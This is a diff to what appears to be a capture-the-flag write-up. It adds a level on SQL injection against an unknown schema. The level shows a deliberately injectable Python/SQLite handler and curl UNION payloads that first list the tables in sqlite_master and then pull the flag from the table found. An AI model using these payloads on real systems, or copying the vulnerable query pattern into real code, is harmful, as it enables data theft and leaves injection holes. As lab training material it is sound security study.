@@ -135,3 +135,29 @@ I form this in `curl`,
 ```sh
 curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20users%20--
 ```
+
+## Level 6 - SQL injection with an unknown schema
+
+```python
+def level6():
+    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
+    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
+                'SELECT "flag" AS username, ? AS password'),
+               (flag,))
+
+    query = request.args.get("query", "%")
+    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
+    return "".join(f'{user["username"]}\n' for user in users)
+```
+
+Once again, use a UNION but this time to list tables, `SELECT name FROM sqlite_master`,
+
+```sh
+curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20name%20FROM%20sqlite_master%20--
+```
+
+This gives me the table name `table13213357520839709907` which I can use like in level 5,
+
+```sh
+curl -v http://challenge.localhost:80?query=%22%20UNION%20SELECT%20password%20FROM%20table13213357520839709907%20--
+```
